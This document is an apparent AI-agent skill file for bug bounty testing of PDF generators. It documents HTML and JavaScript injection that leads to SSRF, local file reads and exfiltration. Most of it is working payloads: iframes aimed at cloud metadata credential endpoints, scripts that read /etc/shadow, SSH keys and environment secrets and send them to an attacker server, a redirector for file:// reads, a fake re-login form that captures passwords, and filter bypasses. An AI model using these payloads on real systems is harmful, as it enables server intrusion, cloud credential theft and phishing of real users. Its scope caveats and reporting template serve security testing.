---
name: pdf-injection
description: PDF Generation Vulnerabilities — HTML/JS injection into PDF generators causing SSRF, LFI, server-side XSS, and data exfiltration. Use when the target generates PDFs from user-controlled input (invoices, reports, certificates, export functions), when HauntMode flags PDF generation as APPLIES/MAYBE, or when testing features that accept HTML/rich-text input that feeds a server-side renderer.
---

# PDF Generation Vulnerabilities (CWEE — Injection Attacks)

Read top-to-bottom on first invocation. Later runs can jump to the relevant section.

---

## 1. Triggers — when this skill applies

- Any "Export to PDF", "Print", "Generate Invoice", "Download Report" functionality
- Certificate generation, statement download, payslip export
- Contact forms or ticket systems that generate PDF receipts
- Rich-text / WYSIWYG editor input that is later rendered into a PDF
- Features where user-supplied name, address, description, or notes appear in a generated document
- Import by URL features that fetch remote HTML and convert to PDF
- Any response where downloading triggers a PDF that contains your previously-submitted input

---

---

## 3. 30-second triage

1. Download an existing PDF from the target (invoice, report, etc.)
2. Run `exiftool filename.pdf` to identify the generator library
3. Inject a simple HTML tag into a user-controlled field that appears in the PDF: `<b>BOLD_TEST</b>`
4. Generate the PDF — if the text is bold, HTML injection is confirmed
5. Escalate to JS/iframe/LFI testing

**Generator identification table** (from exiftool `Creator`/`Producer` fields):

| exiftool output | Library | Notes |
|---|---|---|
| `wkhtmltopdf` + `Qt` version | wkhtmltopdf | JS execution, SSRF via iframe/img/link, LFI via XHR or redirect |
| `dompdf` | DomPDF | Limited JS; LFI via CSS font loading; SSRF via image tags |
| `mPDF` | mPDF | Annotations for LFI (`<annotation>`); some versions allow JS |
| `PD4ML` | PD4ML | Attachments for LFI (`<pd4ml:attachment>`) |
| `TCPDF` / `html2pdf` | TCPDF/html2pdf | Usually no JS; limited HTML subset |
| `Puppeteer` / Chrome Headless | Puppeteer | Full JS execution → powerful SSRF, LFI, credential exfil |
| `PhantomJS` | PhantomJS | JS execution; deprecated but still found in older apps |
| `Prince` | PrinceXML | JS execution in some configs |
| No metadata / stripped | Unknown | Test all techniques |

If no PDF is available yet, probe by submitting `<b>test</b>` and generating the first PDF — bold text = HTML injection.

---

## 4. Detection — confirming HTML injection

Start with the safest possible payload — no network calls, no file access:

```html
<b>PDF_INJECT_TEST</b>
```

If text is bold in the PDF → HTML injection confirmed.

Then confirm JS execution:
```html
<script>document.write('JS_EXEC_TEST')</script>
```

If `JS_EXEC_TEST` appears in the PDF → JavaScript executes server-side. This is the most powerful scenario.

Then confirm path disclosure (safe info leak that proves JS works):
```html
<script>document.write(window.location)</script>
```

The `window.location` in a PDF generator shows the local filesystem path where the temporary HTML file is written: `file:///var/www/html/tmp_wkhtmltopdf_XXXX.html` — this confirms server-side JS and leaks the web root path.

---

## 5. SSRF payloads

### 5.1 Blind SSRF — OOB probe (confirm SSRF exists)

```html
<img src="YOUR_EZXSS_DOMAIN/pdf-ssrf-img"/>
<link rel="stylesheet" href="YOUR_EZXSS_DOMAIN/pdf-ssrf-css">
<iframe src="YOUR_EZXSS_DOMAIN/pdf-ssrf-iframe"></iframe>
```

Check ezXSS dashboard at `YOUR_EZXSS_DOMAIN` for callbacks. Use unique path suffixes to identify which input field triggered it.

### 5.2 Non-blind SSRF via iframe (response in PDF)

The iframe tag causes the server to fetch the URL and embed the response in the PDF — this is what turns blind SSRF into full response exfiltration:

```html
<iframe src="http://127.0.0.1:8080/" width="800" height="500"></iframe>
```

Probe internal services:
```html
<iframe src="http://127.0.0.1:80/" width="800" height="500"></iframe>
<iframe src="http://127.0.0.1:8080/" width="800" height="500"></iframe>
<iframe src="http://127.0.0.1:8443/" width="800" height="500"></iframe>
<iframe src="http://127.0.0.1:3000/" width="800" height="500"></iframe>
<iframe src="http://127.0.0.1:9200/" width="800" height="500"></iframe>
```

AWS metadata (critical on cloud-hosted targets):
```html
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="800" height="500"></iframe>
```

GCP metadata:
```html
<iframe src="http://metadata.google.internal/computeMetadata/v1/instance/" width="800" height="500"></iframe>
```

Azure metadata:
```html
<iframe src="http://169.254.169.254/metadata/instance?api-version=2021-02-01" width="800" height="500"></iframe>
```

Internal API access:
```html
<iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
<iframe src="http://127.0.0.1:8080/api/admin" width="800" height="500"></iframe>
```

### 5.3 Port scanning via SSRF

Generate PDFs with different port numbers and compare:
- PDF generates normally (iframe loads something) → port is open
- PDF shows empty iframe or hangs → port is closed

Ports to check: 21, 22, 25, 80, 443, 3306, 5432, 5984, 6379, 8080, 8443, 9200, 27017

---

## 6. LFI payloads

### 6.1 LFI with JavaScript execution (preferred)

Direct file read:
```html
<script>
    x = new XMLHttpRequest();
    x.onload = function(){
        document.write(this.responseText)
    };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>
```

Base64 encoded output (for files with special characters, prevents XML/HTML breaking):
```html
<script>
    x = new XMLHttpRequest();
    x.onload = function(){
        document.write(btoa(this.responseText))
    };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>
```

Base64 with line breaks every 100 characters (prevents truncation at PDF page edge):
```html
<script>
    function addNewlines(str) {
        var result = '';
        while (str.length > 0) {
            result += str.substring(0, 100) + '\n';
            str = str.substring(100);
        }
        return result;
    }

    x = new XMLHttpRequest();
    x.onload = function(){
        document.write(addNewlines(btoa(this.responseText)))
    };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>
```

Decode: `echo "BASE64_WITH_NEWLINES" | tr -d '\n' | base64 -d`

Interesting files to read:
```
file:///etc/passwd
file:///etc/shadow
file:///etc/hostname
file:///proc/self/environ
file:///var/www/html/index.php
file:///var/www/html/config.php
file:///var/www/html/.env
file:///home/www-data/.ssh/id_rsa
file:///root/.ssh/id_rsa
file:///etc/apache2/sites-enabled/000-default.conf
file:///var/log/apache2/access.log
```

### 6.2 LFI without JavaScript (fallback)

When JS execution is not available:
```html
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500"></object>
<portal src="file:///etc/passwd" width="800" height="500"></portal>
```

These often show empty iframes in newer library versions. If so, use the redirect trick:

**Redirect trick** — host a PHP redirector on your server:
```php
<?php header('Location: file://' . $_GET['url']); ?>
```

Then inject:
```html
<iframe src="http://YOUR_SERVER_IP:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
```

The PDF library follows the redirect and renders the file content.

### 6.3 mPDF annotation LFI

For applications using mPDF (check exiftool output):
```html
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
```

The file is attached to the PDF as a clickable annotation. Open the PDF in a viewer and click the annotation icon.

Note: Disabled after mPDF 6.0 by default, but can be re-enabled. Worth trying.

### 6.4 PD4ML attachment LFI

For applications using PD4ML:
```html
<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
```

---

## 7. JavaScript-based credential capture and exfiltration

When the PDF generator executes JS server-side (Puppeteer, wkhtmltopdf, PhantomJS), use fetch/XHR to exfiltrate data to your server.

### 7.1 Exfiltrate via HTTP GET (fastest to set up)

Start listener: `python3 -m http.server 8000`

Then inject:
```html
<script>
    x = new XMLHttpRequest();
    x.onload = function(){
        var data = btoa(this.responseText);
        new Image().src = 'http://YOUR_SERVER_IP:8000/exfil?d=' + encodeURIComponent(data);
    };
    x.open("GET", "file:///etc/passwd");
    x.send();
</script>
```

Watch server log for the `?d=` parameter, then: `echo "BASE64" | base64 -d`

### 7.2 Exfiltrate environment variables

```html
<script>
    x = new XMLHttpRequest();
    x.onload = function(){
        var data = btoa(this.responseText);
        new Image().src = 'http://YOUR_SERVER_IP:8000/env?d=' + encodeURIComponent(data);
    };
    x.open("GET", "file:///proc/self/environ");
    x.send();
</script>
```

`/proc/self/environ` often contains `DATABASE_URL`, `SECRET_KEY`, `AWS_SECRET_ACCESS_KEY`, etc.

### 7.3 Credential capture via form action

Inject a fake form whose submission sends credentials to your server:
```html
<h2>Session Expired — Please Re-authenticate</h2>
<form action="http://YOUR_SERVER_IP:8000/capture" method="POST">
    <input name="username" placeholder="Username" type="text"><br>
    <input name="password" placeholder="Password" type="password"><br>
    <input type="submit" value="Login">
</form>
```

This is high-impact if the PDF is viewed by an admin user who enters credentials.

### 7.4 CSS-based data exfiltration (side-channel, no JS required)

Uses CSS `font-face` loading as a timing/callback oracle when JS is blocked. For each character position in a secret value, load a different font URL:

```html
<style>
@font-face {
    font-family: poc;
    src: url(http://YOUR_SERVER_IP:8000/font?char=a);
    unicode-range: U+0061; /* 'a' */
}
@font-face {
    font-family: poc;
    src: url(http://YOUR_SERVER_IP:8000/font?char=b);
    unicode-range: U+0062; /* 'b' */
}
/* ... one per character in the charset ... */
body { font-family: poc; }
</style>
<p id="secret">CONTENT_TO_EXFILTRATE</p>
```

The browser loads the font URL for each unique character in the rendered text. By watching which font URLs are requested, you can determine which characters appear in the content. Primarily useful for short secrets (API keys, tokens). Generates many HTTP requests — be mindful of rate limits.

---

## 8. Fingerprinting the generator when exiftool shows nothing

When you can't download a PDF to run exiftool, fingerprint by behavior:

1. **Check `window.location` via JS** → if it shows `file:///` path, JS executes
2. **Inject `<b>` tag** → bold in PDF = HTML rendering
3. **Inject `<script>document.title='TEST'</script>`** → if PDF title changes = wkhtmltopdf/Puppeteer
4. **Try iframe to localhost** → if the iframe has content = non-blind SSRF (wkhtmltopdf/Puppeteer)
5. **Try `<annotation>` tag** → if PDF has an annotation icon = mPDF
6. **Check HTTP User-Agent** of the OOB callback (use a server that logs headers): wkhtmltopdf sends `wkhtmltopdf`, Puppeteer sends a headless Chrome UA

| Behavior | Likely library |
|---|---|
| JS executes + full iframe SSRF | wkhtmltopdf or Puppeteer |
| JS executes, iframe SSRF blocked | PhantomJS or restricted Puppeteer |
| No JS, iframe works | Older wkhtmltopdf config |
| No JS, no iframe, `<annotation>` works | mPDF |
| No JS, no iframe, no annotation | DomPDF, TCPDF, html2pdf |
| CSS loaded from remote, no JS | DomPDF |

---

## 9. Bypass techniques

### 9.1 Encoding the payload

If the injection field is sanitized for `<` and `>`:
- Check if the sanitization only applies to the UI display but the PDF generator receives the raw stored value
- URL-encode: `%3Ciframe%20src%3D%22file:///etc/passwd%22%3E%3C%2Fiframe%3E`
- HTML entities: `&lt;script&gt;` — won't execute, but the PDF library may decode them before rendering

### 9.2 CSS injection (when HTML is filtered but CSS is not)

If only CSS is injectable (e.g., custom theme/color fields):
```css
@import url(http://YOUR_SERVER_IP:8000/css-ssrf);
```

This triggers an SSRF. Limited — you can't read file contents, only confirm the SSRF.

### 9.3 Injecting in PDF-specific fields

Beyond the obvious input fields, check:
- Document title / metadata fields → some generators use these in the HTML template
- File name inputs that appear in the PDF header/footer
- Email or username that appears in the PDF template

---

## 10. False-positive checks

- **HTML tags appear as literal text** — the generator is escaping output before feeding to the renderer. True for well-configured TCPDF/html2pdf. Note and skip.
- **`<b>TEST</b>` is bold but JS doesn't execute** — HTML injection confirmed but JS blocked. Switch to non-JS LFI techniques (iframe, annotation, redirect).
- **Iframe renders but shows "blocked"** — the library follows the URL but the security policy blocks external/internal requests. Try different protocols or the redirect technique.
- **OOB callback received from PDF generation but iframe is empty** — the library fetches external resources (confirms SSRF) but doesn't embed the response. Exploit as blind SSRF to enumerate internal ports.
- **PDF generation takes much longer than normal** — suggests the iframe/XHR is causing a network request (connection attempt, even if refused). Confirms something is being fetched.

---

## 11. Chain candidates

| Chain | Other skill | Impact |
|---|---|---|
| PDF SSRF → AWS metadata → IAM credentials | `ssrf` | Cloud compromise |
| PDF LFI → read `.env` / `config.php` → DB creds | Direct DB access | Data breach |
| PDF LFI → read SSH private key | SSH access | Server takeover |
| PDF SSRF → internal API → IDOR | `idor` | Horizontal privilege escalation |
| PDF SSRF → internal service → further injection | `sqli`, `cmdi`, `nosqli` | Secondary exploitation |
| XSS in stored field → PDF generator renders it → LFI | `xss` | Stored XSS pivots to LFI |
| PDF generation takes user-supplied URL → SSRF | `ssrf` | Confirmed SSRF via import feature |

---

## 12. Reporting template

```
POTENTIAL FINDING: PDF Generation Vulnerability — <SSRF | LFI | Server-Side XSS>
Target: <URL of the PDF generation endpoint / feature that triggers PDF>
Input field: <name of the field where payload was injected>
PDF library: <wkhtmltopdf 0.12.6.1 | Puppeteer | mPDF | DomPDF | unknown>
Identified via: <exiftool output | behavioral fingerprinting>
HTML injection confirmed: <yes/no — <b> tag rendered>
JS execution confirmed: <yes/no — document.write/window.location>
Working payload:
    <exact HTML/JS injected>
Evidence:
    <PDF screenshot or content showing /etc/passwd, metadata response, OOB callback timestamp>
Data accessed: <specific files read, internal endpoints reached, cloud metadata obtained>
Impact:
    <arbitrary file read on server | SSRF to cloud metadata → IAM key exposure | internal service access>
Chain potential: <LFI → source code → secondary vuln, SSRF → internal API → IDOR>
Next step: <read /proc/self/environ for secrets, enumerate internal services, read SSH keys>
```

---

## 13. Recon tracker vector strings

Only log if user explicitly authorizes:

- `pdf:html-inject:<field>` — HTML injection confirmed in named field
- `pdf:js-exec` — JavaScript execution confirmed in PDF generator
- `pdf:ssrf-blind` — blind SSRF confirmed via OOB callback
- `pdf:ssrf-full` — non-blind SSRF (iframe response visible in PDF)
- `pdf:lfi:<file>` — LFI confirmed, specific file read
- `pdf:aws-meta` — AWS metadata reachable via PDF SSRF
- `pdf:generator:<library>` — generator identified
- `pdf:no:<reason>` — tested, generator escapes HTML input

---

## 14. What NOT to do

- **Do not inject payloads that make continuous requests** (infinite loops, recursive fetches). The PDF generator runs on the server — an infinite loop crashes the service.
- **Do not attempt to exfiltrate bulk data** beyond what proves the vulnerability. `/etc/passwd` first 10 lines is sufficient for LFI PoC. Don't dump the entire filesystem.
- **Do not use the credential-capture form injection** against real users without explicit authorization. This crosses into active social engineering.
- **Do not probe internal network ranges** beyond localhost and cloud metadata without confirming internal-SSRF-chaining is in scope for this program.
- **Do not auto-log to the recon tracker** without explicit user instruction (CLAUDE.md hard rule).
- **Do not leave injected payloads in stored fields** (profile name, invoice notes, etc.) — clean up after confirming the finding. Other users (including admins) may generate PDFs containing your payload.
